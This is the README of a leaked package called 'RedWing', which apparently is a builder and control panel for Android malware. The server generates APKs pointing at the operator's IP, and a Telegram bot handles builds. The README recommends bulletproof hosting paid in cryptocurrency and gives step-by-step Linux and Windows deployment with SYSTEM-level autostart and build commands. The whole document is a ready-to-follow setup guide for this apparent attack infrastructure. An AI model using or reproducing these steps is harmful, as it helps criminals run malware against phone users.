```
██████╗ ███████╗██████╗ ██╗    ██╗██╗███╗   ██╗ ██████╗
██╔══██╗██╔════╝██╔══██╗██║    ██║██║████╗  ██║██╔════╝
██████╔╝█████╗  ██║  ██║██║ █╗ ██║██║██╔██╗ ██║██║  ███╗
██╔══██╗██╔══╝  ██║  ██║██║███╗██║██║██║╚██╗██║██║   ██║
██║  ██║███████╗██████╔╝╚███╔███╔╝██║██║ ╚████║╚██████╔╝
╚═╝  ╚═╝╚══════╝╚═════╝  ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝
      LEAKED BY OMNI | t.me/omnibotnet | omni.lc
```

---

## Содержание / Contents

```
RedWing/
├── bin/
│   ├── linux/server          — готовый бинарник Linux x86_64 / pre-built Linux x86_64 binary
│   └── windows/server.exe    — готовый бинарник Windows x86_64 / pre-built Windows x86_64 binary
├── source/                   — полные исходники / full source code
│   ├── cmd/server/           — точка входа / entry point
│   ├── internal/             — серверная логика / server logic
│   ├── web/                  — панель управления (HTML) / control panel (HTML)
│   ├── decom/                — шаблоны APK + инструменты / APK templates + tools
│   ├── go.mod / go.sum       — зависимости Go / Go dependencies
│   └── ...
├── install-linux.sh          — автоустановщик для Linux / auto-installer for Linux
├── install-windows.bat       — автоустановщик для Windows / auto-installer for Windows
└── README.md                 — этот файл / this file
```

---

## 1. Покупка сервера / Getting a Server

Рекомендуемый хостинг с оплатой криптовалютой:
*Recommended hosting with cryptocurrency payment:*


| Провайдер / Provider | Сайт / Website                           | Оплата / Payment    |
| -------------------- | ---------------------------------------- | ------------------- |
| **HOSTKEY**          | [hostkey.com](https://hostkey.com)       | BTC, ETH, XMR, USDT |
| **BulletProof**      | [bulletproof.ad](https://bulletproof.ad) | BTC, ETH, XMR, USDT |


**Минимальные требования / Minimum Requirements:**

- 1 vCPU / 1 GB RAM / 10 GB SSD
- Ubuntu 22.04+ или / or Windows Server 2019+
- Открытый порт / Open port `8080` (или другой по выбору / or any other of your choice)

---

## 2. Установка на Linux (Ubuntu/Debian) / Installation on Linux (Ubuntu/Debian)

### Автоматическая / Automatic

```bash
chmod +x install-linux.sh
sudo ./install-linux.sh
```

### Ручная / Manual

**Шаг 1 — Зависимости / Step 1 — Dependencies:**

```bash
apt update && apt install -y openjdk-17-jre-headless wget unzip

# Android SDK build-tools (нужен apktool + zipalign / apktool + zipalign required)
wget https://bitbucket.org/nicholaschum/apktool-builder/downloads/apktool_2.9.3.jar -O /usr/local/bin/apktool.jar
wget https://raw.githubusercontent.com/nicholaschum/apktool-builder/main/scripts/linux/apktool -O /usr/local/bin/apktool
chmod +x /usr/local/bin/apktool

# zipalign из Android SDK / zipalign from Android SDK
ANDROID_BT="https://dl.google.com/android/repository/build-tools_r35-linux.zip"
wget "$ANDROID_BT" -O /tmp/bt.zip
unzip -j /tmp/bt.zip "*/zipalign" -d /usr/local/bin/
chmod +x /usr/local/bin/zipalign

# apksigner из Android SDK / apksigner from Android SDK
unzip -j /tmp/bt.zip "*/apksigner" "*/lib/*" -d /usr/local/lib/android/
ln -sf /usr/local/lib/android/apksigner /usr/local/bin/apksigner
chmod +x /usr/local/bin/apksigner
```

**Шаг 2 — Развёртывание / Step 2 — Deployment:**

```bash
mkdir -p /opt/redwing
cp bin/linux/server /opt/redwing/server
cp -r source/decom /opt/redwing/decom
cp -r source/web /opt/redwing/web
chmod +x /opt/redwing/server
```

**Шаг 3 — Запуск / Step 3 — Launch:**

```bash
cd /opt/redwing
./server
```

При первом запуске будет запрошено:
*On first launch you will be prompted for:*

1. **IP адрес сервера / Server IP address** — внешний IP для APK-билдов / external IP for APK builds
2. **Режим регистрации / Registration mode** — `open` / `closed`
3. **Логин/Пароль админа / Admin login/password** (если closed / if closed)

**Шаг 4 — Systemd (автозапуск) / Step 4 — Systemd (autostart):**

```bash
cat > /etc/systemd/system/redwing.service << 'EOF'
[Unit]
Description=RedWing Server
After=network.target

[Service]
Type=simple
WorkingDirectory=/opt/redwing
ExecStart=/opt/redwing/server
Restart=always
RestartSec=5
Environment=PORT=8080
Environment=SERVER_IP=ВАШ_IP

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable --now redwing
```

> При использовании systemd передавайте параметры через Environment:
> *When using systemd, pass parameters via Environment:*
> `SERVER_IP`, `PORT`, `REGISTRATION=open`, `DB_PATH`, `BUILDER_BOT_TOKEN`

---

## 3. Установка на Windows Server / Installation on Windows Server

### Автоматическая / Automatic

Запустите `install-windows.bat` от имени Администратора.
*Run `install-windows.bat` as Administrator.*

### Ручная / Manual

**Шаг 1 — Зависимости / Step 1 — Dependencies:**

1. Скачайте и установите **Java 17+** / Download and install **Java 17+**: [https://adoptium.net/](https://adoptium.net/)
2. Скачайте **Android command-line tools** / Download **Android command-line tools**: [https://developer.android.com/studio#command-line-tools-only](https://developer.android.com/studio#command-line-tools-only)
3. Установите `apktool` / Install `apktool`: [https://apktool.org/docs/install](https://apktool.org/docs/install)
4. Из command-line tools установите build-tools / From command-line tools install build-tools:
  ```cmd
   sdkmanager "build-tools;35.0.0"
  ```
5. Добавьте в PATH / Add to PATH: `C:\android-sdk\build-tools\35.0.0\`

**Шаг 2 — Развёртывание / Step 2 — Deployment:**

```cmd
mkdir C:\RedWing
copy bin\windows\server.exe C:\RedWing\
xcopy /E source\decom C:\RedWing\decom\
xcopy /E source\web C:\RedWing\web\
```

**Шаг 3 — Запуск / Step 3 — Launch:**

```cmd
cd C:\RedWing
server.exe
```

**Шаг 4 — Автозапуск (Task Scheduler) / Step 4 — Autostart (Task Scheduler):**

```cmd
schtasks /create /tn "RedWing" /tr "C:\RedWing\server.exe" ^
  /sc onstart /ru SYSTEM /rl HIGHEST
```

Или через `sc.exe`:
*Or via `sc.exe`:*

```cmd
sc create RedWing binPath="C:\RedWing\server.exe" start=auto
sc start RedWing
```

---

## 4. Переменные окружения / Environment Variables


| Переменная / Variable | Описание / Description                          | По умолчанию / Default |
| --------------------- | ----------------------------------------------- | ---------------------- |
| `PORT`                | Порт сервера / Server port                      | `8080`                 |
| `SERVER_IP`           | Внешний IP (для APK) / External IP (for APK)    | автоопределение / auto |
| `REGISTRATION`        | `open` / `closed`                               | `closed`               |
| `DB_PATH`             | Путь к БД SQLite / SQLite DB path               | `data/redwing.db`      |
| `BUILDER_BOT_TOKEN`   | Токен Telegram-бота / Telegram bot token        | —                      |


---

## 5. Панель управления / Control Panel

После запуска откройте в браузере:
*After starting, open in your browser:*

```
http://YOUR_IP:8080
```

---

## 6. Сборка из исходников / Building from Source

Если вы хотите собрать самостоятельно:
*If you want to build it yourself:*

```bash
cd source/
go build -o server ./cmd/server/
```

Кросс-компиляция / Cross-compilation:

```bash
# Linux
GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o server ./cmd/server/

# Windows
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o server.exe ./cmd/server/
```

Требуется **Go 1.21+**.
*Requires **Go 1.21+**.*

---

## 7. Telegram Builder Bot

Для работы Telegram-билдера укажите `BUILDER_BOT_TOKEN` или введите токен при запуске.
*To use the Telegram builder, set `BUILDER_BOT_TOKEN` or enter the token at startup.*

Создайте бота через [@BotFather](https://t.me/BotFather).
*Create a bot via [@BotFather](https://t.me/BotFather).*

---

```
LEAKED BY OMNI | t.me/omnibotnet | omni.lc
```
